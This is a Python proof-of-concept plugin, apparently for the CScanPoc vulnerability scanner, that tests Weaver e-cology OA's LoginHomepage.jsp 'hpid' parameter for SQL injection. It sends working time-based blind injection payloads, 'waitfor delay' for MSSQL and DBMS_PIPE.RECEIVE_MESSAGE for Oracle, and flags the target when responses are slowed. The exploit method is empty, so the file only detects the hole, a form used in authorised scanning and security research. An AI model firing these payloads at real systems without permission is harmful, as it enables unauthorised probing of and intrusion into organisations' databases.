# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import md5
import time

class Vuln(ABVuln):
    poc_id = 'bcd2a83e-ec4c-475a-9898-3c15ca2503fe'
    name = '泛微e-cology SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-10-10'  # 漏洞公布时间
    desc = '''
        泛微e-cology参数过滤不严谨，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '00735700-c4a6-4d14-9610-5e1bac563978'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-078802
            hh = hackhttp.hackhttp()
            #MSSQL
            payload1 = "/homepage/LoginHomepage.jsp?hpid=21%20waitfor%20delay%20'0:0:5'"
            payload2 = "/homepage/LoginHomepage.jsp?hpid=21%20waitfor%20delay%20'0:0:0'"
            t1 = time.time()
            code1, head1, res1, errcode1, _1 = hh.http(self.target + payload1)
            t2 = time.time()
            code2, head2, res2, errcode2, _2 = hh.http(self.target + payload2) 
            t3 = time.time()
            if (t2 - t1 - t3 + t2 > 3):
                #security_hole(_1+' has injection(MSSQL)')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            #Oracle
            else:
                payload1 = "/homepage/LoginHomepage.jsp?hpid=21%20and%201=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(199)||CHR(81)||CHR(109),5)"
                payload2 = "/homepage/LoginHomepage.jsp?hpid=21%20and%201=1"
                t1 = time.time()
                code1, head1, res1, errcode1, _1 = hh.http(self.target + payload1)
                t2 = time.time()
                code2, head2, res2, errcode2, _2 = hh.http(self.target + payload2) 
                t3 = time.time()
                if (t2 - t1 - t3 + t2 > 3):
                    #security_hole(_1+' has injection(Oracle)')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
